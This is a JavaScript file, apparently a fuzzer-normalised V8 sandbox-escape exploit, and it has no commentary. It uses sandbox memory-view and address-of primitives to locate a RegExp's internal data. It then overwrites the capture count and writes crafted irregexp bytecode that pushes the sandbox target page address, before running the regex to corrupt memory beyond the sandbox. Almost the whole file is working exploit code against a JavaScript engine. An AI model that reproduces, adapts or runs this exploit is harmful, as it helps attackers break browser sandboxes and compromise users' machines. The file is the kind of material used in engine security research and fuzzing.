try {
    var DEBUG = false;
    let v4;
    try { v4 = new ArrayBuffer(8); } catch (e) {}
    var buf = v4;
    let v7;
    try { v7 = new DataView(buf); } catch (e) {}
    var dv = v7;
    function assert(a10, a11) {
        if (a11 === undefined) {
            a11 = "";
        }
        if (!a10) {
            throw "Assetion failed: " + a11;
        }
    }
    function dp(a19) {
        if (DEBUG) {
            try { eval("%DebugPrint(o)"); } catch (e) {}
        }
    }
    function hex(a24) {
        let v27;
        try { v27 = a24.toString(16); } catch (e) {}
        return "0x" + v27;
    }
    function packU64(a30, a31) {
        return a30 | (a31 << 32n);
    }
    function u2f(a36) {
        try { dv.setBigUint64(0, a36, true); } catch (e) {}
        let v42;
        try { v42 = dv.getFloat64(0, true); } catch (e) {}
        return v42;
    }
    function f2u(a44) {
        try { dv.setFloat64(0, a44, true); } catch (e) {}
        let v50;
        try { v50 = dv.getBigUint64(0, true); } catch (e) {}
        return v50;
    }
    function s2u(a52) {
        return a52 >>> 0;
    }
    function lower(a56) {
        const v58 = a56 & 4294967295;
        let v59;
        try { v59 = s2u(v58); } catch (e) {}
        return v59;
    }
    function upper(a61) {
        let v63;
        try { v63 = BigInt(a61); } catch (e) {}
        const v65 = v63 >> 32n;
        let v67;
        try { v67 = parseInt(v65); } catch (e) {}
        return v67;
    }
    function printh(a69) {
        let v70;
        try { v70 = hex(a69); } catch (e) {}
        try { console.log(v70); } catch (e) {}
    }
    function print(a74) {
        try { console.log(a74); } catch (e) {}
    }
    const v78 = Sandbox?.MemoryView;
    let v81;
    try { v81 = new v78(0, 4294967296); } catch (e) {}
    let v82;
    try { v82 = new DataView(v81); } catch (e) {}
    var memory = v82;
    const v84 = (a85) => {
        let v86;
        try { v86 = Sandbox.getAddressOf(a85); } catch (e) {}
        return v86;
    };
    var addrof = v84;
    const v88 = (a89) => {
        let v91;
        try { v91 = memory.getUint32(a89, true); } catch (e) {}
        return v91;
    };
    var readHeap4 = v88;
    const v93 = (a94, a95) => {
        let v97;
        try { v97 = memory.setUint8(a94, a95, true); } catch (e) {}
        return v97;
    };
    var writeHeap1 = v93;
    const v99 = (a100, a101) => {
        let v103;
        try { v103 = memory.setUint32(a100, a101, true); } catch (e) {}
        return v103;
    };
    var writeHeap4 = v99;
    const v105 = (a106, a107) => {
        let v109;
        try { v109 = memory.setBigUint64(a106, a107, true); } catch (e) {}
        return v109;
    };
    var writeHeap8 = v105;
    re = /a*b/;
    let v115;
    try { v115 = ("a").repeat(1); } catch (e) {}
    const v117 = v115 + "b";
    try { re.exec(v117); } catch (e) {}
    let v121;
    try { v121 = addrof(re); } catch (e) {}
    let v122;
    try { v122 = hex(v121); } catch (e) {}
    const v123 = "re @ " + v122;
    try { print(v123); } catch (e) {}
    let v125;
    try { v125 = addrof(re); } catch (e) {}
    const v127 = v125 + 12;
    let v128;
    try { v128 = readHeap4(v127); } catch (e) {}
    reDataAddr = v128;
    let v132;
    try { v132 = hex(reDataAddr); } catch (e) {}
    const v133 = "re->data @ " + v132;
    try { print(v133); } catch (e) {}
    const v138 = (reDataAddr + 28) - 1;
    let v139;
    try { v139 = readHeap4(v138); } catch (e) {}
    reBytecodeAddr = v139;
    let v143;
    try { v143 = hex(reBytecodeAddr); } catch (e) {}
    const v144 = "re->bytecode @ " + v143;
    try { print(v144); } catch (e) {}
    function setUseBytecode(a147) {
        let v148;
        try { v148 = addrof(a147); } catch (e) {}
        const v150 = v148 + 12;
        let v151;
        try { v151 = readHeap4(v150); } catch (e) {}
        let reeDataAddr = v151;
        let reeCaptureCountAddr = (reDataAddr + 48) - 1;
        try { writeHeap4(reeCaptureCountAddr, 4294967294); } catch (e) {}
    }
    try { setUseBytecode(re); } catch (e) {}
    function setBytecode(a162, a163) {
        let v164;
        try { v164 = addrof(a162); } catch (e) {}
        const v166 = v164 + 12;
        let v167;
        try { v167 = readHeap4(v166); } catch (e) {}
        let reeDataAddr = v167;
        const v172 = (reeDataAddr + 28) - 1;
        let v173;
        try { v173 = readHeap4(v172); } catch (e) {}
        let reeBytecodeAddr = v173 - 1;
        const v178 = reeBytecodeAddr + 4;
        let v179;
        try { v179 = readHeap4(v178); } catch (e) {}
        let reeBytecodeSize = v179 >> 1;
        const v184 = a163?.length <= reeBytecodeSize;
        try { assert(v184, "bytecode does not fit!"); } catch (e) {}
        for (let i188 = 0; i188 < a163?.length; i188++) {
            const v198 = (reeBytecodeAddr + (4 * i188)) + 8;
            const v199 = a163?.[i188];
            try { writeHeap4(v198, v199); } catch (e) {}
        }
    }
    function setBytecodeAtOffset(a202, a203, a204) {
        let v205;
        try { v205 = addrof(a202); } catch (e) {}
        const v207 = v205 + 12;
        let v208;
        try { v208 = readHeap4(v207); } catch (e) {}
        let reeDataAddr = v208;
        const v213 = (reeDataAddr + 28) - 1;
        let v214;
        try { v214 = readHeap4(v213); } catch (e) {}
        let reeBytecodeAddr = v214 - 1;
        const v219 = reeBytecodeAddr + 4;
        let v220;
        try { v220 = readHeap4(v219); } catch (e) {}
        let reeBytecodeSize = v220 >> 1;
        const v226 = a204?.length == 2;
        try { assert(v226, "[opcode, operand]"); } catch (e) {}
        for (let i230 = 0; i230 < a204?.length; i230++) {
            const v243 = ((reeBytecodeAddr + (4 * a203)) + (4 * i230)) + 8;
            const v244 = a204?.[i230];
            try { writeHeap4(v243, v244); } catch (e) {}
        }
    }
    const BACKTRACK_END_TO_REGS_OFF = 268;
    const PUSH_BT = 2;
    const PUSH_REGISTER = 3;
    const SET_REGISTER = 4;
    const ADVANCE_REGISTER = 9;
    const POP_CP = 10;
    const POP_REGISTER = 12;
    const LOAD_4_CURRENT_CHARS_UNCHECKED = 22;
    const v262 = Sandbox?.targetPage;
    let v263;
    try { v263 = lower(v262); } catch (e) {}
    let sbxLower = v263;
    const v265 = Sandbox?.targetPage;
    let v266;
    try { v266 = upper(v265); } catch (e) {}
    let sbxUpper = v266;
    const v286 = [POP_REGISTER | 0,PUSH_BT,1,POP_REGISTER | 0,POP_REGISTER | 0,POP_REGISTER | 0,POP_REGISTER | 256,ADVANCE_REGISTER | 256,BACKTRACK_END_TO_REGS_OFF,PUSH_REGISTER | 256,PUSH_BT,sbxLower,PUSH_BT,sbxUpper,SET_REGISTER | 0,1094795585];
    try { setBytecode(re, v286); } catch (e) {}
    try { re.exec("aaaaaaaaaaaaaaaaaaaaaaaaab"); } catch (e) {}
} catch(e290) {
}
